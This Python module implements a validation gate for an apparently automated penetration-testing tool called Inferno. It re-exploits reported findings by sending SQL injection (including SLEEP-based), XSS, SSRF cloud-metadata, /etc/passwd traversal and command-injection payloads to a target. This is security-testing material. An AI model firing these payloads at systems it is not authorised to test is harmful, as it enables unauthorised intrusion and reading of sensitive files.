"""
Validation Gate for Inferno.

Automatically re-tests findings to confirm they are exploitable.
This gate ensures no false positives are reported.

Key features:
- Automated re-exploitation
- PoC script generation
- Evidence collection
- Impact verification
"""

from __future__ import annotations

import asyncio
from typing import Any

import structlog

from inferno.quality.candidate import FindingCandidate
from inferno.quality.gate import QualityGate

logger = structlog.get_logger(__name__)


class ValidationGate(QualityGate):
    """
    Quality gate that validates findings through re-exploitation.

    This gate re-runs the exploit to confirm the vulnerability
    is real and captures evidence for the report.
    """

    def __init__(
        self,
        max_retries: int = 3,
        require_evidence: bool = True,
    ) -> None:
        """
        Initialize the validation gate.

        Args:
            max_retries: Maximum times to retry validation
            require_evidence: Whether to require captured evidence
        """
        super().__init__(
            name="validation",
            weight=10.0,  # Highest weight - must validate
            is_blocking=True,  # Findings MUST pass validation
            description="Validates findings through automated re-exploitation",
        )
        self._max_retries = max_retries
        self._require_evidence = require_evidence

    async def evaluate(
        self,
        candidate: FindingCandidate,
        target: str,
        **kwargs: Any,
    ) -> tuple[bool, str]:
        """
        Validate a finding by re-exploiting it.

        Args:
            candidate: Finding candidate to validate
            target: Target URL/hostname
            **kwargs: Additional parameters including http_client, executor

        Returns:
            Tuple of (passed, message)
        """
        http_client = kwargs.get("http_client")
        executor = kwargs.get("executor")

        logger.info(
            "validation_gate_starting",
            finding_type=candidate.vuln_type,
            endpoint=candidate.endpoint,
        )

        # Check if we have reproduction steps
        if not candidate.reproduction_steps:
            return False, "No reproduction steps provided - cannot validate"

        # Try to validate based on vulnerability type
        vuln_type = candidate.vuln_type.lower()

        validation_handlers = {
            "sqli": self._validate_sqli,
            "sql_injection": self._validate_sqli,
            "xss": self._validate_xss,
            "cross_site_scripting": self._validate_xss,
            "ssrf": self._validate_ssrf,
            "lfi": self._validate_lfi,
            "local_file_inclusion": self._validate_lfi,
            "rce": self._validate_rce,
            "command_injection": self._validate_rce,
            "idor": self._validate_idor,
        }

        handler = validation_handlers.get(vuln_type, self._validate_generic)

        # Attempt validation with retries
        for attempt in range(1, self._max_retries + 1):
            try:
                success, evidence, message = await handler(
                    candidate=candidate,
                    target=target,
                    http_client=http_client,
                    executor=executor,
                )

                if success:
                    # Store evidence in candidate
                    if evidence:
                        candidate.evidence = candidate.evidence or []
                        candidate.evidence.append({
                            "type": "validation",
                            "content": evidence,
                            "attempt": attempt,
                        })
                    candidate.validated = True

                    logger.info(
                        "validation_passed",
                        finding_type=candidate.vuln_type,
                        attempt=attempt,
                    )
                    return True, f"Validation passed on attempt {attempt}: {message}"

            except Exception as e:
                logger.warning(
                    "validation_attempt_failed",
                    attempt=attempt,
                    error=str(e),
                )
                if attempt < self._max_retries:
                    await asyncio.sleep(1)  # Brief pause between retries
                continue

        return False, f"Validation failed after {self._max_retries} attempts"

    async def _validate_sqli(
        self,
        candidate: FindingCandidate,
        target: str,
        http_client: Any | None,
        executor: Any | None,
    ) -> tuple[bool, str | None, str]:
        """Validate SQL injection finding."""
        if not http_client:
            return False, None, "No HTTP client available"

        # Parse reproduction steps to extract URL and payload
        endpoint = candidate.endpoint or target
        payload = self._extract_payload(candidate.reproduction_steps)

        if not payload:
            return False, None, "Could not extract payload from reproduction steps"

        # Try the original payload
        try:
            response = await http_client.request(
                method="GET",
                url=endpoint,
                params={"q": payload} if "?" not in endpoint else None,
            )

            # Check for SQLi indicators in response
            sqli_indicators = [
                "sql syntax",
                "mysql",
                "sqlite",
                "postgresql",
                "ora-",
                "syntax error",
                "unclosed quotation",
                "UNION",
            ]

            response_text = response.get("body", "").lower()
            for indicator in sqli_indicators:
                if indicator.lower() in response_text:
                    return True, response_text[:500], f"SQL error indicator found: {indicator}"

            # Try time-based validation
            time_payload = payload.replace("'", "' AND SLEEP(3)--")
            import time
            start = time.time()

            await http_client.request(
                method="GET",
                url=endpoint,
                params={"q": time_payload},
            )

            elapsed = time.time() - start
            if elapsed >= 3.0:
                return True, f"Time-based: {elapsed:.2f}s delay", "Time-based SQLi confirmed"

        except Exception as e:
            return False, None, f"Validation request failed: {e}"

        return False, None, "Could not confirm SQLi"

    async def _validate_xss(
        self,
        candidate: FindingCandidate,
        target: str,
        http_client: Any | None,
        executor: Any | None,
    ) -> tuple[bool, str | None, str]:
        """Validate XSS finding."""
        if not http_client:
            return False, None, "No HTTP client available"

        endpoint = candidate.endpoint or target
        payload = self._extract_payload(candidate.reproduction_steps)

        if not payload:
            # Use a simple detection payload
            payload = "<script>alert('XSS')</script>"

        try:
            response = await http_client.request(
                method="GET",
                url=endpoint,
                params={"q": payload},
            )

            response_text = response.get("body", "")

            # Check if payload is reflected unescaped
            if payload in response_text:
                return True, response_text[:500], "XSS payload reflected unescaped"

            # Check for common XSS patterns
            xss_patterns = [
                "<script>",
                "onerror=",
                "onload=",
                "javascript:",
            ]
            for pattern in xss_patterns:
                if pattern in response_text and pattern in payload:
                    return True, response_text[:500], f"XSS pattern reflected: {pattern}"

        except Exception as e:
            return False, None, f"Validation request failed: {e}"

        return False, None, "XSS payload not reflected"

    async def _validate_ssrf(
        self,
        candidate: FindingCandidate,
        target: str,
        http_client: Any | None,
        executor: Any | None,
    ) -> tuple[bool, str | None, str]:
        """Validate SSRF finding."""
        if not http_client:
            return False, None, "No HTTP client available"

        endpoint = candidate.endpoint or target

        # Try common SSRF payloads
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80/",
            "http://localhost/",
        ]

        for payload in ssrf_payloads:
            try:
                response = await http_client.request(
                    method="GET",
                    url=endpoint,
                    params={"url": payload},
                )

                response_text = response.get("body", "").lower()

                # Check for cloud metadata
                if "ami-id" in response_text or "instance-id" in response_text:
                    return True, response_text[:500], "AWS metadata accessible via SSRF"

                # Check for localhost response
                if "<!doctype html" in response_text and "localhost" in payload:
                    return True, response_text[:500], "Localhost accessible via SSRF"

            except Exception:
                continue

        return False, None, "Could not confirm SSRF"

    async def _validate_lfi(
        self,
        candidate: FindingCandidate,
        target: str,
        http_client: Any | None,
        executor: Any | None,
    ) -> tuple[bool, str | None, str]:
        """Validate LFI finding."""
        if not http_client:
            return False, None, "No HTTP client available"

        endpoint = candidate.endpoint or target

        # Try common LFI payloads
        lfi_payloads = [
            ("../../../etc/passwd", ["root:", "/bin/bash", "/bin/sh"]),
            ("....//....//etc/passwd", ["root:", "/bin/bash"]),
            ("..%2f..%2f..%2fetc/passwd", ["root:"]),
        ]

        for payload, indicators in lfi_payloads:
            try:
                response = await http_client.request(
                    method="GET",
                    url=endpoint,
                    params={"file": payload, "page": payload, "path": payload},
                )

                response_text = response.get("body", "")

                for indicator in indicators:
                    if indicator in response_text:
                        return True, response_text[:500], f"LFI confirmed: {indicator} found"

            except Exception:
                continue

        return False, None, "Could not confirm LFI"

    async def _validate_rce(
        self,
        candidate: FindingCandidate,
        target: str,
        http_client: Any | None,
        executor: Any | None,
    ) -> tuple[bool, str | None, str]:
        """Validate RCE/command injection finding."""
        # RCE validation requires caution
        # We use detection payloads that prove execution without causing harm

        if not http_client:
            return False, None, "No HTTP client available"

        endpoint = candidate.endpoint or target

        # Use harmless detection payloads
        rce_tests = [
            ("; echo INFERNO_RCE_TEST", "INFERNO_RCE_TEST"),
            ("| echo INFERNO_RCE_TEST", "INFERNO_RCE_TEST"),
            ("`echo INFERNO_RCE_TEST`", "INFERNO_RCE_TEST"),
            ("$(echo INFERNO_RCE_TEST)", "INFERNO_RCE_TEST"),
        ]

        for payload, indicator in rce_tests:
            try:
                response = await http_client.request(
                    method="POST",
                    url=endpoint,
                    data={"cmd": payload, "command": payload, "exec": payload},
                )

                if indicator in response.get("body", ""):
                    return True, response.get("body", "")[:500], "Command execution confirmed"

            except Exception:
                continue

        return False, None, "Could not confirm RCE"

    async def _validate_idor(
        self,
        candidate: FindingCandidate,
        target: str,
        http_client: Any | None,
        executor: Any | None,
    ) -> tuple[bool, str | None, str]:
        """Validate IDOR finding."""
        if not http_client:
            return False, None, "No HTTP client available"

        # IDOR validation requires comparing responses for different IDs
        # This is a simplified check

        endpoint = candidate.endpoint or target

        try:
            # Try to access a resource with different ID
            response1 = await http_client.request(
                method="GET",
                url=endpoint.replace("/1", "/2").replace("id=1", "id=2"),
            )

            # If we got a 200 response with different content, potential IDOR
            if response1.get("status_code") == 200:
                return True, response1.get("body", "")[:500], "Different resource accessible (potential IDOR)"

        except Exception:
            pass

        return False, None, "Could not confirm IDOR"

    async def _validate_generic(
        self,
        candidate: FindingCandidate,
        target: str,
        http_client: Any | None,
        executor: Any | None,
    ) -> tuple[bool, str | None, str]:
        """Generic validation for unknown vulnerability types."""
        # For generic vulnerabilities, check if we have evidence
        if candidate.evidence:
            return True, str(candidate.evidence), "Pre-existing evidence accepted"

        if candidate.reproduction_steps:
            # If we have detailed reproduction steps, accept with warning
            return True, None, "Manual reproduction steps provided (requires human verification)"

        return False, None, "Insufficient evidence for validation"

    def _extract_payload(self, reproduction_steps: list[str] | str) -> str | None:
        """Extract payload from reproduction steps."""
        if isinstance(reproduction_steps, str):
            steps = reproduction_steps
        else:
            steps = "\n".join(reproduction_steps)

        # Look for common payload patterns
        import re

        # Look for quoted strings that might be payloads
        patterns = [
            r"payload[:\s]+['\"]([^'\"]+)['\"]",
            r"inject[:\s]+['\"]([^'\"]+)['\"]",
            r"['\"]([^'\"]*(?:select|union|script|alert|../)[^'\"]*)['\"]",
        ]

        for pattern in patterns:
            match = re.search(pattern, steps, re.I)
            if match:
                return match.group(1)

        return None


# Function to create and register the gate
def create_validation_gate(
    max_retries: int = 3,
    require_evidence: bool = True,
) -> ValidationGate:
    """
    Create a validation gate instance.

    Args:
        max_retries: Maximum validation attempts
        require_evidence: Whether to require evidence

    Returns:
        Configured ValidationGate instance
    """
    return ValidationGate(
        max_retries=max_retries,
        require_evidence=require_evidence,
    )
